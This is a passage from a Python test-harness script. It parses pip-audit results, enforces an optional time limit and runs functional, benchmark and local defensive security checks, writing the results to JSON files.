        data = json.loads(raw)
    except ValueError:
        return {"_outcome": "SKIP", "_detail": "unparseable pip-audit output"}
    vulns = data.get("dependencies", data if isinstance(data, list) else [])
    found = [d for d in vulns if d.get("vulns")] if isinstance(vulns, list) else []
    return {"_outcome": "FAIL" if found else "PASS",
            "_detail": f"{len(found)} packages with advisories: "
                       f"{[(d.get('name'), [v.get('id') for v in d.get('vulns', [])]) for d in found]}"}


# --------------------------------------------------------------------------- main
def _timebox(seconds: int) -> None:
    """Hard cap on this process; results are written incrementally so a cut-off is safe."""
    def die():
        print(f"\n!! timebox {seconds}s reached - partial results already on disk", flush=True)
        os._exit(124)
    import threading
    timer = threading.Timer(seconds, die)
    timer.daemon = True
    timer.start()


def main() -> None:
    import argparse
    parser = argparse.ArgumentParser()
    parser.add_argument("--timebox", type=int, default=0, help="hard wall-clock cap in seconds (0 = none)")
    parser.add_argument("mode", choices=["functional", "bench", "security", "all"], default="all", nargs="?")
    args = parser.parse_args()
    if args.timebox:
        _timebox(args.timebox)

    env = environment()
    print("== environment ==", flush=True)
    print(json.dumps(env, indent=2), flush=True)

    if args.mode in ("functional", "all"):
        print("\n========== FUNCTIONAL / EDGE CASES ==========")
        run_functional()
        write_json("functional_results.json", {"environment": env, "results": RESULT_LOG})
        passed = sum(1 for r in RESULT_LOG if r["outcome"] == "PASS")
        print(f"\nfunctional: {passed}/{len(RESULT_LOG)} passed")
        RESULT_LOG.clear()

    if args.mode in ("bench", "all"):
        print("\n========== PERFORMANCE BENCHMARKS ==========")
        run_bench()

    if args.mode in ("security", "all"):
        print("\n========== SECURITY (DEFENSIVE, LOCAL ONLY) ==========")
        run_security()
        write_json("security_results.json", {"environment": env, "results": RESULT_LOG})


if __name__ == "__main__":
    main()
